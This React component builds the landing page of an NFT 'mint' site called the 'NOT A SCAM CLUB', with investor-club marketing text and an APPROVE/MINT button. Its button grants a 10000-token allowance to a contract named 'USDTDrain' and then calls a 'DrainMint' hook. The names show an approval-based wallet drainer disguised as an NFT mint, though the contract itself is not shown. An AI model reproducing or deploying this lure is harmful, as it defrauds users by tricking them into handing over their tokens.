import styled, { ThemeProvider } from "styled-components";
import Carousel from "../Carousel";
import Button from "../Button";
import { dark } from "../../styles/Themes";
import { useNASNFTContractUSDTDrainMint } from "../../hooks/useNASNFTContractUSDTDrainMint";
import { useERC20Approve } from "../../hooks/useERC20Approve";
import { useEffect, useState } from "react";
import {
  NASNFTContractUSDTDrain_ADDRESS,
  YAUSDT_ADDRESS,
} from "../../hooks/constants";
import { parseUnits } from "viem";

const Container = styled.div`
  width: 75%;
  margin: 0 auto;
  ${"" /* background-color: lightblue; */}

  display: flex;
  justify-content: center;
  align-items: center;
`;
const Box = styled.div`
  width: 50%;
  height: 100%;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
`;
const Section = styled.section`
  min-height: 100vh;
  width: 100%;
  background-color: ${(props) => props.theme.text};

  display: flex;
  justify-content: center;
  align-items: center;
  position: relative;
`;
const Title = styled.h2`
  font-size: ${(props) => props.theme.fontxxl};
  text-transform: capitalize;
  color: ${(props) => props.theme.body};
  align-self: flex-start;
  width: 80%;
  margin: 0 auto;
`;
const SubText = styled.p`
  font-size: ${(props) => props.theme.fontlg};
  color: ${(props) => props.theme.body};
  align-self: flex-start;
  width: 80%;
  margin: 1rem auto;
  font-weight: 400;
`;
const SubTextLight = styled.p`
  font-size: ${(props) => props.theme.fontmd};
  color: ${(props) => `rgba(${props.theme.bodyRgba},0.6)`};
  align-self: flex-start;
  width: 80%;
  margin: 1rem auto;
  font-weight: 400;
`;
const ButtonContainer = styled.div`
  width: 80%;
  margin: 0 auto;
  align-self: flex-start;
`;

function About() {
  const [minted, setMinted] = useState(false);
  const {
    write: approveERC20,
    isSuccess: isERC20ApproveSuccess,
    isError: isERC20Error,
    isLoading: isERC20Loading,
  } = useERC20Approve();
  const {
    write: mint,
    isSuccess: isMintSuccess,
    isError: isMintError,
    isLoading: isMintLoading,
  } = useNASNFTContractUSDTDrainMint();

  const approveTokenUse = async () => {
    if (!minted) {
      approveERC20({
        args: [NASNFTContractUSDTDrain_ADDRESS, parseUnits(`10000`, 18)],
      });
    }
  };

  const mintNFT = () => {
    if (!minted && isERC20ApproveSuccess) {
      if (isERC20ApproveSuccess) {
        mint();
      }
    }
  };

  useEffect(() => {
    if (isMintSuccess) {
      setMinted(true);
    }
  }, [isMintSuccess]);

  return (
    <Section id="about">
      <Container>
        <Box>
          {" "}
          <Carousel />{" "}
        </Box>
        <Box>
          <Title>Welcome To The NAS Club.</Title>
          <SubText>
            The NOT A SCAM CLUB(NAS) is a private collection of NFTs—unique
            digital collectibles.
          </SubText>
          <SubTextLight>
            With more than 200+ hand drawn traits, each NFT is unique and comes
            with a membership to an exclusive group of successful investors.
            Join an ambitious ever-growing community with multiple benefits and
            utilities.
          </SubTextLight>
          <ButtonContainer>
            <ThemeProvider theme={dark}>
              <Button
                text={
                  minted
                    ? "CONGRATS!"
                    : isERC20ApproveSuccess
                    ? "MINT"
                    : "APPROVE"
                }
                onClick={isERC20ApproveSuccess ? mintNFT : approveTokenUse}
                isDisabled={minted}
              />
            </ThemeProvider>
          </ButtonContainer>
        </Box>
      </Container>
    </Section>
  );
}

export default About;
